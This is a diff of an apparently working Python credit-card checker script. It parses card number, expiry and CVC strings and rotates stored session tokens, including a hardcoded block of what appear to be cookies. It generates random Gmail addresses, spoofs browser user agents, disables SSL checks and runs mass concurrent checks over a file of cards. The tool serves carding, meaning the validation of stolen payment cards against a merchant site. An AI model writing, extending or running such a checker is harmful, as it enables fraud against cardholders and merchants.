@@ -1,56 +1,62 @@
 import aiohttp
+import asyncio
 import re
 import random
 import string
-from bs4 import BeautifulSoup
+from fake_useragent import UserAgent
+
+# Initialize UserAgent
+ua = UserAgent()
 
 async def fetch_nonce(session, url, pattern, proxy=None):
     try:
         async with session.get(url, proxy=proxy) as response:
             text = await response.text()
-            return re.search(pattern, text).group(1)
-    except:
+            match = re.search(pattern, text)
+            return match.group(1) if match else None
+    except Exception as e:
+        print(f"Nonce fetch error: {str(e)}")
         return None
 
 async def Tele(ccx, user_agent, proxy=None, email=None):
-    ccx = ccx.strip()
-    parts = ccx.split("|")
-    if len(parts) < 4:
-        return "Invalid CC format"
-    
-    n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
-    yy = yy.replace("20", "") if "20" in yy else yy
-
-    # Token rotation logic
     try:
-        with open('fileb3.txt', 'r+') as file:
-            lines = file.readlines()
-            if len(lines) == 0:
-                lines = DEFAULT_LINES.split('\n')
-            
-            first_line = lines[0].strip()
-            available_lines = [line.strip() for line in lines if line.strip() != first_line]
-            
-            if not available_lines:
-                big = first_line
-            else:
-                big = random.choice(available_lines)
-            
-            file.seek(0)
-            file.truncate()
-            file.write(big + '\n')
-    except FileNotFoundError:
-        return "Token file not found"
+        ccx = ccx.strip()
+        parts = ccx.split("|")
+        if len(parts) < 4:
+            return "Invalid CC format"
+        
+        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
+        yy = yy.replace("20", "") if "20" in yy else yy
 
-    headers = {
-        "User-Agent": user_agent,
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.5",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Connection": "keep-alive",
-    }
+        # Token rotation logic
+        try:
+            with open('fileb3.txt', 'r+') as file:
+                lines = file.readlines()
+                if len(lines) == 0:
+                    lines = DEFAULT_LINES.split('\n')
+                
+                first_line = lines[0].strip()
+                available_lines = [line.strip() for line in lines if line.strip() != first_line]
+                
+                if not available_lines:
+                    big = first_line
+                else:
+                    big = random.choice(available_lines)
+                
+                file.seek(0)
+                file.truncate()
+                file.write(big + '\n')
+        except FileNotFoundError:
+            return "Token file not found"
 
-    try:
+        headers = {
+            "User-Agent": user_agent,
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Connection": "keep-alive",
+        }
+
         connector = aiohttp.TCPConnector(ssl=False)
         async with aiohttp.ClientSession(headers=headers, connector=connector) as session:
             # Registration nonce
@@ -143,3 +149,29 @@ DEFAULT_LINES = """hxhcdrr%7C1713641609%7CXOJGK2xFYyXD6Wom3p2Cujj2ZkzyHqXGk13kFu
 jsnxuwv%7C1713641702%7CLuntNS8UCY3lTvN6Yq0pXDIWhRoQN6T2rIJcVUYHqrW%7C81172a53f2d4f6da23bb1b177581990c34ac15331baad10c4d3bad3500cd0559
 bdjqisha%7C1713641764%7C6XL7TRIFD9CrHleBLzzCSt7ymVS4pAGUu5mYFW0s5XN%7C84adb5191193048c127086078a87c34bcf50e586791ccd976e5dd088b037346b
 djdnsbba%7C1713641897%7CL5FleSTWtIImxvKpB3JvEdk09qZLTGEPUaxNadcBsno%7C7ebd4c043b84acda974813d5eaf330f62d91fad75f7ee3d0300f06abc52bcaf4"""
+
+async def check_cc(cc, proxy=None):
+    user_agent = ua.chrome
+    email = f"{''.join(random.choices(string.ascii_lowercase, k=12))}@gmail.com"
+    result = await Tele(
+        ccx=cc,
+        user_agent=user_agent,
+        proxy=proxy,
+        email=email
+    )
+    print(f"{cc} => {result}")
+
+async def main():
+    # Read CCs from file
+    with open('ccs.txt', 'r') as f:
+        ccs = [line.strip() for line in f.readlines() if line.strip()]
+    
+    # Create tasks
+    tasks = [check_cc(cc) for cc in ccs]
+    
+    # Run concurrently
+    await asyncio.gather(*tasks)
+
+if __name__ == "__main__":
+    print("تم تشغيل البوت")
+    asyncio.run(main())
